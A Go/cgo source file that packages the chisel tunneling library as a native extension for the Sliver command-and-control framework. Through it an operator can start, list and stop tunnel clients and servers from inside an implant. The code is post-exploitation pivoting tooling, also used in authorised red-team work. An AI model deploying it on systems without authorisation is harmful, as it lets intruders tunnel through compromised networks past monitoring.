//go:build cgo

package main

/*
#include <stdint.h>
#include <stdlib.h>

#if defined(_WIN32) && defined(__i386__)
#define SLIVER_CALLBACK __attribute__((stdcall))
#else
#define SLIVER_CALLBACK
#endif

typedef int32_t (SLIVER_CALLBACK *sliver_callback_t)(char *, int32_t);

static int32_t sliver_call_callback(sliver_callback_t cb, char *data, int32_t len) {
	return cb(data, len);
}
*/
import "C"

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"unsafe"

	chclient "github.com/jpillora/chisel/client"
	chserver "github.com/jpillora/chisel/server"
	"github.com/jpillora/chisel/share/ccrypto"
	"github.com/jpillora/chisel/share/settings"
)

// entrypoint implements the Sliver native extension ABI:
//
//	int32_t entrypoint(char *buffer, uint32_t size, callback(char *, int32_t))
//
// chisel's tunnels run in their own goroutines, so the call returns as soon as
// the task is started and Sliver gets its response immediately.
//
//export entrypoint
func entrypoint(buffer *C.char, size C.uint32_t, callback C.sliver_callback_t) C.int32_t {
	args := ""
	if buffer != nil && size > 0 {
		args = C.GoStringN(buffer, C.int(size))
	}
	out, err := dispatch(strings.Fields(args))
	if err != nil {
		return respond(callback, "chisel error: "+err.Error(), 1)
	}
	return respond(callback, out, 0)
}

func respond(callback C.sliver_callback_t, msg string, rc C.int32_t) C.int32_t {
	if callback != nil {
		cs := C.CString(msg)
		defer C.free(unsafe.Pointer(cs))
		C.sliver_call_callback(callback, cs, C.int32_t(len(msg)))
	}
	return rc
}

// sliverTask is one running chisel client or server.
type sliverTask struct {
	id      uint32
	kind    string
	command string
	cancel  context.CancelFunc
	client  *chclient.Client
	server  *chserver.Server
}

var (
	taskMu   sync.Mutex
	tasks    = map[uint32]*sliverTask{}
	lastID   uint32
	chiselMu sync.Mutex // guards os.Args while parsing
)

func dispatch(args []string) (string, error) {
	if len(args) == 0 {
		return "", fmt.Errorf("usage: client|server|list|stop <taskId>")
	}
	switch args[0] {
	case "list":
		return listTasks(), nil
	case "stop":
		return stopTask(args[1:])
	case "client", "server":
		return startTask(args)
	}
	return "", fmt.Errorf("unknown command %q, use client, server, list or stop", args[0])
}

func startTask(args []string) (string, error) {
	serverConfig := newServerOptions()
	clientConfig := newClientOptions()
	cli := newCLI(serverConfig, clientConfig)

	chiselMu.Lock()
	os.Args = append([]string{"chisel"}, args...)
	_, err := cli.ParseArgsError(os.Args)
	chiselMu.Unlock()
	if err != nil {
		return "", err
	}

	task := &sliverTask{kind: args[0], command: strings.Join(args, " ")}
	ctx, cancel := context.WithCancel(context.Background())
	task.cancel = cancel

	switch args[0] {
	case "client":
		c, err := startClient(clientConfig, ctx)
		if err != nil {
			cancel()
			return "", err
		}
		task.client = c
	case "server":
		s, err := startServer(serverConfig, ctx)
		if err != nil {
			cancel()
			return "", err
		}
		task.server = s
	}

	taskMu.Lock()
	lastID++
	task.id = lastID
	tasks[task.id] = task
	taskMu.Unlock()

	return fmt.Sprintf("task %d started: %s", task.id, task.command), nil
}

func startClient(o *clientOptions, ctx context.Context) (*chclient.Client, error) {
	config := &o.Config
	for _, header := range o.Header {
		if err := setHeader(config.Headers, header); err != nil {
			return nil, err
		}
	}
	if config.Auth == "" {
		config.Auth = os.Getenv("AUTH")
	}
	if o.Hostname != "" {
		config.Headers.Set("Host", o.Hostname)
		config.TLS.ServerName = o.Hostname
	}
	if o.SNI != "" {
		config.TLS.ServerName = o.SNI
	}
	c, err := chclient.NewClient(config)
	if err != nil {
		return nil, err
	}
	c.Debug = config.Verbose
	if err := c.Start(ctx); err != nil {
		return nil, err
	}
	return c, nil
}

func startServer(o *serverOptions, ctx context.Context) (*chserver.Server, error) {
	config := &o.Config
	if o.KeyGen != "" {
		return nil, ccrypto.GenerateKeyFile(o.KeyGen, config.KeySeed)
	}
	if o.Host == "" {
		o.Host = os.Getenv("HOST")
	}
	if o.Host == "" {
		o.Host = "0.0.0.0"
	}
	if o.Port == "" {
		o.Port = os.Getenv("PORT")
	}
	if o.Port == "" {
		o.Port = "8080"
	}
	if config.KeyFile == "" {
		config.KeyFile = settings.Env("KEY_FILE")
	}
	if config.KeySeed == "" {
		config.KeySeed = settings.Env("KEY")
	}
	if config.Auth == "" {
		config.Auth = os.Getenv("AUTH")
	}
	s, err := chserver.NewServer(config)
	if err != nil {
		return nil, err
	}
	s.Debug = o.Verbose
	if err := s.StartContext(ctx, o.Host, o.Port); err != nil {
		return nil, err
	}
	return s, nil
}

func stopTask(args []string) (string, error) {
	if len(args) < 1 {
		return "", fmt.Errorf("usage: stop <taskId>")
	}
	id, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid taskId %q", args[0])
	}

	taskMu.Lock()
	task, ok := tasks[uint32(id)]
	if ok {
		delete(tasks, uint32(id))
	}
	taskMu.Unlock()
	if !ok {
		return "", fmt.Errorf("no task %d", id)
	}

	task.cancel()
	if task.client != nil {
		task.client.Close()
	}
	if task.server != nil {
		task.server.Close()
	}
	return fmt.Sprintf("task %d stopped\n%s", id, listTasks()), nil
}

func listTasks() string {
	taskMu.Lock()
	defer taskMu.Unlock()
	if len(tasks) == 0 {
		return "no running tasks"
	}
	ids := make([]uint32, 0, len(tasks))
	for id := range tasks {
		ids = append(ids, id)
	}
	sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })

	var b strings.Builder
	for _, id := range ids {
		t := tasks[id]
		fmt.Fprintf(&b, "taskID=%d type=%s command=%s\n", t.id, t.kind, t.command)
	}
	return strings.TrimSuffix(b.String(), "\n")
}
